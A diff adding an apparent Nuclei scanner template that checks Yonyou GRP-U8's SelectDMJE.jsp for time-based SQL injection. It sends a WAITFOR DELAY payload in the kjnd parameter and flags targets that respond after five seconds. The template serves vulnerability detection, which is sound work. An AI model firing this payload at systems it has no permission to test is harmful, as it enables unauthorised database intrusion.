@@ -1,0 +1,28 @@
+id: YongYouGRPU8_SelectDMJE_sqlInjection
+
+info:
+  name: YongYouGRPU8_SelectDMJE_sqlInjection
+  author: iSee857
+  severity: high
+  description: |-
+    YongYouGRPU8_SelectDMJE_sqlInjection
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        GET /u8qx/SelectDMJE.jsp?kjnd=1%27;WAITFOR%20DELAY%20%270:0:5%27-- HTTP/1.1
+        Host: {{Host}}
+        Accept: */*
+        Connection: close
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "duration >= 5"
+      - type: status
+        status:
+          - 200
